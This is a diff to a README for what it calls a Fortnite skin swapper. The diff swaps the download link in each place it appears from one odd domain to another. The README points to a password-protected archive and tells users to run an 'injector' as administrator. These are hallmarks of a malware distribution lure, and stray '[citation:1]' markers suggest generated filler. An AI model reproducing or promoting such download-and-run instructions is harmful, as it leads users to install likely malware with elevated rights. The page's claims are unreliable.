@@ -6,7 +6,7 @@ Real-time skin swapper for Fortnite. Swap skins, emotes, pickaxes, back bling, g
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -87,7 +87,7 @@ Based on community tools like Saturn Swapper, Pro Swapper, and Galaxy Swapper [c
 
 ## 🔧 Installation / How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. **Run your injector** with administrator rights [citation:1].
 4. **Launch Fortnite** and wait for the game to load.
